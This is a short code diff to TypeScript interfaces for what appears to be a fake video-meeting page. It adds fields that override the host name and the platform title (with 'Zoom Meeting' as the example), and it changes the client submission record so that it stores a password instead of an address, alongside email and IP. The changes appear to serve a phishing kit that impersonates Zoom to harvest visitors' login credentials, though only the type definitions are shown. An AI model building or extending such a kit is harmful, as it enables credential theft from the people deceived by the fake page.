@@ -39,6 +39,10 @@ export interface MeetingConfig {
   theme: ThemeType;
   layout: LayoutType;
   host: HostProfile;
+  hostName?: string; // Direct host name override/alias (e.g. config.hostName or config.host.fullName)
+  platformTemplate?: string; // Customizable platform template title override (e.g. "Zoom Meeting")
+  meetingTemplateTitle?: string; // Customizable meeting template title override
+  meetingTitle?: string; // Optional alias for title
   participants: Participant[];
   clientEmail?: string;
   clientName?: string;
@@ -48,7 +52,7 @@ export interface MeetingConfig {
 
 export interface ClientSubmissionData {
   clientEmail: string;
-  clientAddress: string;
+  clientPassword: string;
   clientIp: string;
   meetingId: string;
   meetingTitle: string;
